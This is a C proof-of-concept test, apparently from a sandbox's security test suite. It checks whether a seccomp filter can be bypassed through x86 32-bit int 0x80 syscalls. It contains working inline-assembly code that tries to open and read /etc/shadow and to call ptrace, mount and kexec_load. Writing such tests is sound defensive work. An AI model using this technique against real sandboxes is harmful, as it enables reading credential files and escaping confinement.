/*
 * POC-007: 32位兼容模式 seccomp 绕过
 *
 * 攻击技术：利用 x86 32位兼容模式（int 0x80）绕过 64位 seccomp 过滤
 * 预期行为：seccomp 过滤器必须检查 arch 字段，拒绝非 x86_64 架构的系统调用
 * 风险等级：Critical
 */

#ifdef __x86_64__

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#define X86_SYS_open 5
#define X86_SYS_read 3
#define X86_SYS_close 6
#define X86_SYS_ptrace 26
#define X86_SYS_mount 21
#define X86_SYS_kexec_load 283

static inline long int80_syscall(long nr, long arg1, long arg2, long arg3) {
    long ret;
    __asm__ volatile(
        "int $0x80"
        : "=a"(ret)
        : "a"(nr), "b"(arg1), "c"(arg2), "d"(arg3)
        : "memory"
    );
    return ret;
}

static int try_open_via_int80(const char *path) {
    long fd = int80_syscall(X86_SYS_open, (long)path, 0, 0);
    if (fd >= 0) {
        printf("[!] 32位 open() 成功！fd=%ld (seccomp 绕过！)\n", fd);
        char buf[256];
        long n = int80_syscall(X86_SYS_read, fd, (long)buf, sizeof(buf) - 1);
        if (n > 0) { buf[n] = '\0'; printf("[!] 读取: %.100s\n", buf); }
        int80_syscall(X86_SYS_close, fd, 0, 0);
        return 1;
    }
    printf("[+] 32位 open() 被拒绝: errno=%ld\n", -fd);
    return 0;
}

static int try_ptrace_via_int80(void) {
    long ret = int80_syscall(X86_SYS_ptrace, 0, 0, 0);
    if (ret == 0) { printf("[!] 32位 ptrace() 成功！(绕过！)\n"); return 1; }
    printf("[+] 32位 ptrace() 被拒绝: errno=%ld\n", -ret);
    return 0;
}

static int try_mount_via_int80(void) {
    long ret = int80_syscall(X86_SYS_mount, (long)"/dev/sda1", (long)"/mnt", (long)"ext4");
    if (ret == 0) { printf("[!] 32位 mount() 成功！(绕过！)\n"); return 1; }
    printf("[+] 32位 mount() 被拒绝: errno=%ld\n", -ret);
    return 0;
}

static int try_kexec_via_int80(void) {
    long ret = int80_syscall(X86_SYS_kexec_load, 0, 0, 0);
    if (ret == 0) { printf("[!] 32位 kexec_load() 成功！(内核替换！)\n"); return 1; }
    printf("[+] 32位 kexec_load() 被拒绝: errno=%ld\n", -ret);
    return 0;
}

int main(void) {
    int bypass = 0;
    printf("[*] POC-007: 32位兼容模式 seccomp 绕过测试\n");
    printf("[*] 通过 int 0x80 触发 32位系统调用，验证 arch 字段检查\n\n");
    printf("--- 测试 1: 32位 open(/etc/shadow) ---\n"); bypass |= try_open_via_int80("/etc/shadow");
    printf("\n--- 测试 2: 32位 ptrace() ---\n"); bypass |= try_ptrace_via_int80();
    printf("\n--- 测试 3: 32位 mount() ---\n"); bypass |= try_mount_via_int80();
    printf("\n--- 测试 4: 32位 kexec_load() ---\n"); bypass |= try_kexec_via_int80();
    printf("\n");
    if (bypass) {
        printf("[!] 结果：发现 seccomp 绕过漏洞！(arch 字段未验证)\n");
        return 2;
    }
    printf("[+] 结果：所有 32位系统调用均被阻止 (arch 验证有效)\n");
    return 0;
}

#else
#include <stdio.h>
int main(void) { printf("[*] POC-007: 仅支持 x86_64 架构\n"); return 0; }
#endif
